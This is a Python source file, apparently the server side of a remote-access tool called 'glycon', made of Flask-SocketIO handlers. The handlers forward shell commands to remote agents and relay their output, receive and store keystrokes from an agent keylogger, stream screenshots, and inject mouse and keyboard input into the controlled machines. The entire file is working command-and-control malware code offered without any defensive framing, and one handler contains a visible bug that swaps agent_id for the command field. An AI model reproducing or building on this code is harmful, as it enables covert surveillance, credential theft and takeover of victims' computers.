from flask_login import current_user
from flask_socketio import SocketIO, join_room, leave_room, emit
from glycon.config import CONFIG
import sqlite3
from datetime import datetime
import json
import os
from glycon.secure_comms import SecureComms

def init_socket_handlers(socketio):
    active_agents = {}
    keylogger_active_agents = {}  # Track agents with keylogger started
    remote_desktop_active_agents = {}  # Track agents with remote desktop started
    connection_count = 0

    # Ensure keylogs table exists
    conn = sqlite3.connect(CONFIG.database)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS keylogs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT NOT NULL,
            keys TEXT NOT NULL,
            timestamp TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()

    @socketio.on('join_terminal', namespace='/terminal')
    def handle_join_terminal(data):
        if current_user.is_authenticated:
            join_room(f"terminal_{data['agent_id']}")
            print(f"[SocketIO] Terminal UI joined room for agent {data['agent_id']}")
            # Check if agent is already connected and emit status
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            c.execute("SELECT ws_connected FROM agents WHERE id=?", (data['agent_id'],))
            result = c.fetchone()
            conn.close()

            if result and result[0] == 1:
                emit('status', {
                    'status': 'connected',
                    'agent_id': data['agent_id']
                }, room=f"terminal_{data['agent_id']}", namespace='/terminal')
                print(f"[SocketIO] Agent {data['agent_id']} already connected, sent status update")

    @socketio.on('ws_control', namespace='/terminal')
    def handle_ws_control(data):
        if current_user.is_authenticated:
            agent_id = data.get('agent_id')
            action = data.get('action')
            if not agent_id or action not in ['start', 'stop']:
                return

            if action == 'stop':
                # Remove agent from active_agents
                active_agents.pop(agent_id, None)

                # Update database
                conn = sqlite3.connect(CONFIG.database)
                c = conn.cursor()
                c.execute("UPDATE agents SET ws_connected=0 WHERE id=?", (agent_id,))
                conn.commit()
                conn.close()

                # Emit disconnect events
                emit('status', {
                    'status': 'disconnected',
                    'agent_id': agent_id
                }, room=f"terminal_{agent_id}", namespace='/terminal')

                emit('ws_status', {
                    'agent_id': agent_id,
                    'action': 'stop',
                    'status': 'success',
                    'message': 'WebSocket disconnected'
                }, room=f"terminal_{agent_id}", namespace='/terminal')

                print(f"[SocketIO] WebSocket stopped for agent {agent_id}")

    @socketio.on('disconnect', namespace='/terminal')
    def handle_terminal_disconnect():
        nonlocal connection_count
        connection_count -= 1
        print(f"[SocketIO] Terminal client disconnected. Total connections: {connection_count}")

        # Emit stop_keep_alive to all agents when terminal disconnects
        for agent_id in active_agents:
            emit('stop_keep_alive', {}, room=f"agent_{agent_id}", namespace='/terminal')
            print(f"[SocketIO] Sent stop_keep_alive to agent {agent_id}")

    @socketio.on('agent_connect', namespace='/terminal')
    def handle_agent_connect(data):
        nonlocal connection_count
        try:
            print(f"[SocketIO] Agent connection attempt: {data['agent_id']}")
            decrypted = SecureComms.decrypt(data['auth_token'])
            if decrypted.get('agent_id') != data['agent_id']:
                print("[SocketIO] Authentication failed: Invalid token")
                return False
            
            join_room(f"agent_{data['agent_id']}", namespace='/terminal')
            active_agents[data['agent_id']] = True
            connection_count += 1
            print(f"[SocketIO] Agent authenticated. Total connections: {connection_count}")
            print(f"[SocketIO] Current active_agents: {list(active_agents.keys())}")
            
            # Update database
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            c.execute("UPDATE agents SET ws_connected=1 WHERE id=?", (data['agent_id'],))
            conn.commit()
            conn.close()
            
            emit('agent_connected', {
                'status': 'success',
                'agent_id': data['agent_id']
            }, room=f"terminal_{data['agent_id']}", namespace='/terminal')

            emit('status', {
                'status': 'connected',
                'agent_id': data['agent_id']
            }, room=f"terminal_{data['agent_id']}", namespace='/terminal')
            
            emit('status', {
                'status': 'connected',
                'agent_id': data['agent_id']
            }, room=f"terminal_{data['agent_id']}", namespace='/terminal')
            
            print(f"[SocketIO] Agent {data['agent_id']} fully connected")
            return True
        except Exception as e:
            print(f"[SocketIO] Agent connection error: {str(e)}")
            emit('status', {
                'status': 'error',
                'message': str(e),
                'agent_id': data['agent_id']
            }, room=f"terminal_{data['agent_id']}", namespace='/terminal')
            return False

    @socketio.on('disconnect', namespace='/terminal')
    def handle_agent_disconnect():
        nonlocal connection_count
        # Remove agent from active_agents on disconnect
        rooms = socketio.server.manager.rooms.get('/terminal', {})
        disconnected_agents = []
        for agent_id in list(active_agents.keys()):
            if f"agent_{agent_id}" not in rooms:
                disconnected_agents.append(agent_id)
                active_agents.pop(agent_id, None)
                keylogger_active_agents.pop(agent_id, None)
                connection_count -= 1
                print(f"[SocketIO] Agent {agent_id} disconnected and removed from active_agents")
                print(f"[SocketIO] Current active_agents after disconnect: {list(active_agents.keys())}")
                
                conn = sqlite3.connect(CONFIG.database)
                c = conn.cursor()
                c.execute("UPDATE agents SET ws_connected=0 WHERE id=?", (agent_id,))
                conn.commit()
                conn.close()
                
                emit('status', {
                    'status': 'disconnected',
                    'agent_id': agent_id
                }, room=f"terminal_{agent_id}", namespace='/terminal')

                emit('ws_status', {
                    'agent_id': agent_id,
                    'action': 'stop',
                    'status': 'success',
                    'message': 'WebSocket disconnected'
                }, room=f"terminal_{agent_id}", namespace='/terminal')

                # Tell the agent to stop sending keep-alive pings
                emit('stop_keep_alive', {
                    'agent_id': agent_id
                }, room=f"agent_{agent_id}", namespace='/terminal')
        print(f"[SocketIO] Terminal client disconnected. Total connections: {connection_count}")

    @socketio.on('keep_alive', namespace='/terminal')
    def handle_keep_alive(data):
        # Simply acknowledge the keep_alive ping to keep connection alive
        if current_user.is_authenticated:
            agent_id = data.get('agent_id')
            print(f"[SocketIO] Received keep_alive ping from agent {agent_id}")
            emit('keep_alive_ack', {'status': 'success'}, room=f"terminal_{agent_id}", namespace='/terminal')

    @socketio.on('execute_command', namespace='/terminal')
    def handle_execute_command(data):
        if current_user.is_authenticated:
            agent_id = data.get('command')
            command = data.get('command')
            if not agent_id or not command:
                print("[SocketIO] execute_command event missing agent_id or command")
                return
            print(f"[SocketIO] Forwarding command to agent {agent_id}: {command}")
            # Forward the command to the agent's room
            emit('execute_command', {
                'command': command,
                'agent_id': agent_id
            }, room=f"agent_{agent_id}", namespace='/terminal')

    @socketio.on('command', namespace='/terminal')
    def handle_command(data):
        if current_user.is_authenticated:
            agent_id = data.get('agent_id')
            command = data.get('command')
            current_dir = data.get('current_dir')
            if not agent_id or not command:
                print("[SocketIO] command event missing agent_id or command")
                return
            print(f"[SocketIO] Forwarding command to agent {agent_id}: {command} with current_dir: {current_dir}")
            # Forward the command to the agent's room as execute_command event
            emit('execute_command', {
                'command': command,
                'agent_id': agent_id,
                'current_dir': current_dir
            }, room=f"agent_{agent_id}", namespace='/terminal')

    @socketio.on('command_result', namespace='/terminal')
    def handle_command_result(data):
        agent_id = data.get('agent_id')
        if not agent_id:
            print("[SocketIO] command_result event missing agent_id")
            return
        print(f"[SocketIO] Forwarding command result from agent {agent_id}")
        # Forward the result to the terminal UI room
        emit('terminal_output', data, room=f"terminal_{agent_id}", namespace='/terminal')

    @socketio.on('agent_connect', namespace='/keylogger')
    def handle_keylogger_agent_connect(data):
        try:
            print(f"[SocketIO] Keylogger agent connection attempt: {data['agent_id']}")
            decrypted = SecureComms.decrypt(data['auth_token'])
            if decrypted.get('agent_id') != data['agent_id']:
                print("[SocketIO] Keylogger authentication failed: Invalid token")
                return False

            # Auto-start keylogger when agent connects to keylogger namespace
            if data['agent_id'] not in keylogger_active_agents:
                keylogger_active_agents[data['agent_id']] = True
                print(f"[SocketIO] Auto-starting keylogger for agent {data['agent_id']}")

            join_room(f"agent_{data['agent_id']}", namespace='/keylogger')
            active_agents[data['agent_id']] = True
            print(f"[SocketIO] Keylogger agent authenticated: {data['agent_id']}")

            emit('agent_connected', {
                'status': 'success',
                'agent_id': data['agent_id']
            }, room=f"agent_{data['agent_id']}", namespace='/keylogger')

            # Emit keylogger_status to confirm it's started
            emit('keylogger_status', {'status': 'started'}, room=f"agent_{data['agent_id']}", namespace='/keylogger')

            return True
        except Exception as e:
            print(f"[SocketIO] Keylogger agent connection error: {str(e)}")
            emit('status', {
                'status': 'error',
                'message': str(e),
                'agent_id': data['agent_id']
            }, room=f"agent_{data['agent_id']}", namespace='/keylogger')
            return False

    @socketio.on('start_keylogger', namespace='/keylogger')
    def handle_start_keylogger(data):
        agent_id = data.get('agent_id')
        if not agent_id:
            print("[SocketIO] start_keylogger event missing agent_id")
            return
        # Mark keylogger as started for this agent
        keylogger_active_agents[agent_id] = True
        print(f"[SocketIO] Keylogger started on agent {agent_id}")
        emit('keylogger_status', {'status': 'started'}, room=f"agent_{agent_id}", namespace='/keylogger')

    @socketio.on('keylogger_data', namespace='/keylogger')
    def handle_keylogger_data(data):
        agent_id = data.get('agent_id')
        keys = data.get('keys')
        timestamp = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
        if not agent_id or not keys:
            print("[SocketIO] keylogger_data event missing agent_id or keys")
            return
        if agent_id not in keylogger_active_agents:
            print(f"[SocketIO] Unauthorized keylogger_data event received from agent {agent_id}")
            emit('keylogger_ack', {'status': 'error', 'message': 'Keylogger not started'}, room=f"agent_{agent_id}", namespace='/keylogger')
            return
        try:
            print(f"[SocketIO] Saving keylogger data for agent {agent_id}: {keys}")
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            c.execute("PRAGMA foreign_keys = ON")
            c.execute("INSERT INTO keylogs (agent_id, keys, timestamp) VALUES (?, ?, ?)", (agent_id, keys, timestamp))
            conn.commit()
            conn.close()
            emit('keylogger_ack', {'status': 'success'}, room=f"agent_{agent_id}", namespace='/keylogger')
        except sqlite3.IntegrityError as e:
            print(f"[SocketIO] Database integrity error saving keylogger data: {str(e)}")
            emit('keylogger_ack', {'status': 'error', 'message': 'Database integrity error'}, room=f"agent_{agent_id}", namespace='/keylogger')
        except Exception as e:
            print(f"[SocketIO] Error saving keylogger data: {str(e)}")
            emit('keylogger_ack', {'status': 'error', 'message': str(e)}, room=f"agent_{agent_id}", namespace='/keylogger')

    @socketio.on('join', namespace='/keylogger')
    def handle_join(data):
        room = data
        agent_id = None
        if isinstance(data, dict):
            room = data.get('room')
            agent_id = data.get('agent_id')
        if not room:
            print("[SocketIO] join event missing room")
            return
        if agent_id and agent_id not in keylogger_active_agents:
            print(f"[SocketIO] Keylogger join denied: Keylogger not started on agent {agent_id}")
            emit('status', {
                'status': 'error',
                'message': 'Keylogger not started on agent',
                'agent_id': agent_id
            }, room=room, namespace='/keylogger')
            return
        join_room(room, namespace='/keylogger')

    # Remote Desktop SocketIO handlers
    @socketio.on('connect', namespace='/remote_desktop')
    def handle_remote_desktop_connect():
        nonlocal connection_count
        connection_count += 1
        print(f"[SocketIO] Remote Desktop client connected. Total connections: {connection_count}")
        if current_user.is_authenticated:
            print(f"[SocketIO] Authenticated user: {current_user.id}")

    @socketio.on('connect', namespace='/terminal')
    def handle_terminal_connect():
        nonlocal connection_count
        connection_count += 1
        print(f"[SocketIO] Terminal client connected. Total connections: {connection_count}")
        if current_user.is_authenticated:
            print(f"[SocketIO] Authenticated user: {current_user.id}")

    @socketio.on('join_remote_desktop', namespace='/remote_desktop')
    def handle_join_remote_desktop(data):
        if current_user.is_authenticated:
            join_room(f"remote_desktop_{data['agent_id']}")
            print(f"[SocketIO] Remote Desktop UI joined room for agent {data['agent_id']}")
            # Check if agent is already connected and emit status
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            c.execute("SELECT rd_connected FROM agents WHERE id=?", (data['agent_id'],))
            result = c.fetchone()
            conn.close()

            if result and result[0] == 1:
                emit('status', {
                    'status': 'connected',
                    'agent_id': data['agent_id']
                }, room=f"remote_desktop_{data['agent_id']}", namespace='/remote_desktop')
                print(f"[SocketIO] Agent {data['agent_id']} already connected to remote desktop, sent status update")

    @socketio.on('rd_control', namespace='/remote_desktop')
    def handle_rd_control(data):
        if current_user.is_authenticated:
            agent_id = data.get('agent_id')
            action = data.get('action')
            if not agent_id or action not in ['start', 'stop']:
                return

            if action == 'stop':
                # Remove agent from remote_desktop_active_agents
                remote_desktop_active_agents.pop(agent_id, None)

                # Update database
                conn = sqlite3.connect(CONFIG.database)
                c = conn.cursor()
                c.execute("UPDATE agents SET rd_connected=0 WHERE id=?", (agent_id,))
                conn.commit()
                conn.close()

                # Emit stop_screenshots to agent to stop immediately
                emit('stop_screenshots', {
                    'agent_id': agent_id
                }, room=f"agent_{agent_id}", namespace='/remote_desktop')

                # Emit disconnect events
                emit('status', {
                    'status': 'disconnected',
                    'agent_id': agent_id
                }, room=f"remote_desktop_{agent_id}", namespace='/remote_desktop')

                emit('rd_status', {
                    'agent_id': agent_id,
                    'action': 'stop',
                    'status': 'success',
                    'message': 'Remote Desktop disconnected'
                }, room=f"remote_desktop_{agent_id}", namespace='/remote_desktop')

                print(f"[SocketIO] Remote Desktop stopped for agent {agent_id}")

    @socketio.on('disconnect', namespace='/remote_desktop')
    def handle_remote_desktop_disconnect():
        nonlocal connection_count
        connection_count -= 1
        print(f"[SocketIO] Remote Desktop client disconnected. Total connections: {connection_count}")

        # Emit stop_screenshots to all agents when remote desktop disconnects
        for agent_id in remote_desktop_active_agents:
            emit('stop_screenshots', {}, room=f"agent_{agent_id}", namespace='/remote_desktop')
            print(f"[SocketIO] Sent stop_screenshots to agent {agent_id}")

    @socketio.on('agent_connect', namespace='/remote_desktop')
    def handle_remote_desktop_agent_connect(data):
        nonlocal connection_count
        try:
            print(f"[SocketIO] Remote Desktop agent connection attempt: {data['agent_id']}")
            decrypted = SecureComms.decrypt(data['auth_token'])
            if decrypted.get('agent_id') != data['agent_id']:
                print("[SocketIO] Remote Desktop authentication failed: Invalid token")
                return False

            join_room(f"agent_{data['agent_id']}", namespace='/remote_desktop')
            remote_desktop_active_agents[data['agent_id']] = True
            connection_count += 1
            print(f"[SocketIO] Remote Desktop agent authenticated. Total connections: {connection_count}")
            print(f"[SocketIO] Current remote_desktop_active_agents: {list(remote_desktop_active_agents.keys())}")

            # Update database
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            c.execute("UPDATE agents SET rd_connected=1 WHERE id=?", (data['agent_id'],))
            conn.commit()
            conn.close()

            emit('agent_connected', {
                'status': 'success',
                'agent_id': data['agent_id']
            }, room=f"remote_desktop_{data['agent_id']}", namespace='/remote_desktop')

            emit('status', {
                'status': 'connected',
                'agent_id': data['agent_id']
            }, room=f"remote_desktop_{data['agent_id']}", namespace='/remote_desktop')

            print(f"[SocketIO] Remote Desktop agent {data['agent_id']} fully connected")
            return True
        except Exception as e:
            print(f"[SocketIO] Remote Desktop agent connection error: {str(e)}")
            emit('status', {
                'status': 'error',
                'message': str(e),
                'agent_id': data['agent_id']
            }, room=f"remote_desktop_{data['agent_id']}", namespace='/remote_desktop')
            return False

    @socketio.on('disconnect', namespace='/remote_desktop')
    def handle_remote_desktop_agent_disconnect():
        nonlocal connection_count
        # Remove agent from remote_desktop_active_agents on disconnect
        rooms = socketio.server.manager.rooms.get('/remote_desktop', {})
        disconnected_agents = []
        for agent_id in list(remote_desktop_active_agents.keys()):
            if f"agent_{agent_id}" not in rooms:
                disconnected_agents.append(agent_id)
                remote_desktop_active_agents.pop(agent_id, None)
                connection_count -= 1
                print(f"[SocketIO] Remote Desktop agent {agent_id} disconnected and removed from remote_desktop_active_agents")
                print(f"[SocketIO] Current remote_desktop_active_agents after disconnect: {list(remote_desktop_active_agents.keys())}")

                conn = sqlite3.connect(CONFIG.database)
                c = conn.cursor()
                c.execute("UPDATE agents SET rd_connected=0 WHERE id=?", (agent_id,))
                conn.commit()
                conn.close()

                emit('status', {
                    'status': 'disconnected',
                    'agent_id': agent_id
                }, room=f"remote_desktop_{agent_id}", namespace='/remote_desktop')

                emit('rd_status', {
                    'agent_id': agent_id,
                    'action': 'stop',
                    'status': 'success',
                    'message': 'Remote Desktop disconnected'
                }, room=f"remote_desktop_{agent_id}", namespace='/remote_desktop')

                # Tell the agent to stop sending screenshots
                emit('stop_screenshots', {
                    'agent_id': agent_id
                }, room=f"agent_{agent_id}", namespace='/remote_desktop')
        print(f"[SocketIO] Remote Desktop client disconnected. Total connections: {connection_count}")

    @socketio.on('screenshot_update', namespace='/remote_desktop')
    def handle_screenshot_update(data):
        agent_id = data.get('agent_id')
        screenshot = data.get('screenshot')
        if not agent_id or not screenshot:
            print("[SocketIO] screenshot_update event missing agent_id or screenshot")
            return
        # Allow screenshot updates from any agent that is connected to remote_desktop namespace
        # The agent should have been authenticated when it connected
        print(f"[SocketIO] Forwarding screenshot update from agent {agent_id}")
        # Forward the screenshot to the remote desktop UI room
        emit('screenshot_update', data, room=f"remote_desktop_{agent_id}", namespace='/remote_desktop')

    @socketio.on('change_quality', namespace='/remote_desktop')
    def handle_change_quality(data):
        if current_user.is_authenticated:
            agent_id = data.get('agent_id')
            quality = data.get('quality')
            if not agent_id or quality not in ['low', 'medium', 'high']:
                print("[SocketIO] change_quality event missing agent_id or invalid quality")
                return
            print(f"[SocketIO] Forwarding quality change to agent {agent_id}: {quality}")
            # Forward the quality change to the agent's room
            emit('change_quality', {
                'quality': quality,
                'agent_id': agent_id
            }, room=f"agent_{agent_id}", namespace='/remote_desktop')

    @socketio.on('mouse_move', namespace='/remote_desktop')
    def handle_mouse_move(data):
        if current_user.is_authenticated:
            agent_id = data.get('agent_id')
            x = data.get('x')
            y = data.get('y')
            if not agent_id or x is None or y is None:
                print("[SocketIO] mouse_move event missing agent_id, x, or y")
                return
            print(f"[SocketIO] Forwarding mouse move to agent {agent_id}: ({x}, {y})")
            emit('mouse_move', {
                'x': x,
                'y': y,
                'agent_id': agent_id
            }, room=f"agent_{agent_id}", namespace='/remote_desktop')

    @socketio.on('mouse_click', namespace='/remote_desktop')
    def handle_mouse_click(data):
        if current_user.is_authenticated:
            agent_id = data.get('agent_id')
            x = data.get('x')
            y = data.get('y')
            button = data.get('button', 'left')
            if not agent_id or x is None or y is None:
                print("[SocketIO] mouse_click event missing agent_id, x, or y")
                return
            print(f"[SocketIO] Forwarding mouse click to agent {agent_id}: ({x}, {y}) button={button}")
            emit('mouse_click', {
                'x': x,
                'y': y,
                'button': button,
                'agent_id': agent_id
            }, room=f"agent_{agent_id}", namespace='/remote_desktop')

    @socketio.on('mouse_scroll', namespace='/remote_desktop')
    def handle_mouse_scroll(data):
        if current_user.is_authenticated:
            agent_id = data.get('agent_id')
            x = data.get('x')
            y = data.get('y')
            direction = data.get('direction', 'down')
            if not agent_id or x is None or y is None:
                print("[SocketIO] mouse_scroll event missing agent_id, x, or y")
                return
            print(f"[SocketIO] Forwarding mouse scroll to agent {agent_id}: ({x}, {y}) direction={direction}")
            emit('mouse_scroll', {
                'x': x,
                'y': y,
                'direction': direction,
                'agent_id': agent_id
            }, room=f"agent_{agent_id}", namespace='/remote_desktop')

    @socketio.on('keyboard_press', namespace='/remote_desktop')
    def handle_keyboard_press(data):
        if current_user.is_authenticated:
            agent_id = data.get('agent_id')
            key = data.get('key')
            keyCode = data.get('keyCode')
            shiftKey = data.get('shiftKey', False)
            ctrlKey = data.get('ctrlKey', False)
            altKey = data.get('altKey', False)
            if not agent_id or not key:
                print("[SocketIO] keyboard_press event missing agent_id or key")
                return
            print(f"[SocketIO] Forwarding keyboard press to agent {agent_id}: {key} (code: {keyCode})")
            emit('keyboard_press', {
                'key': key,
                'keyCode': keyCode,
                'shiftKey': shiftKey,
                'ctrlKey': ctrlKey,
                'altKey': altKey,
                'agent_id': agent_id
            }, room=f"agent_{agent_id}", namespace='/remote_desktop')

    @socketio.on('keyboard_release', namespace='/remote_desktop')
    def handle_keyboard_release(data):
        if current_user.is_authenticated:
            agent_id = data.get('agent_id')
            key = data.get('key')
            keyCode = data.get('keyCode')
            if not agent_id or not key:
                print("[SocketIO] keyboard_release event missing agent_id or key")
                return
            print(f"[SocketIO] Forwarding keyboard release to agent {agent_id}: {key} (code: {keyCode})")
            emit('keyboard_release', {
                'key': key,
                'keyCode': keyCode,
                'agent_id': agent_id
            }, room=f"agent_{agent_id}", namespace='/remote_desktop')
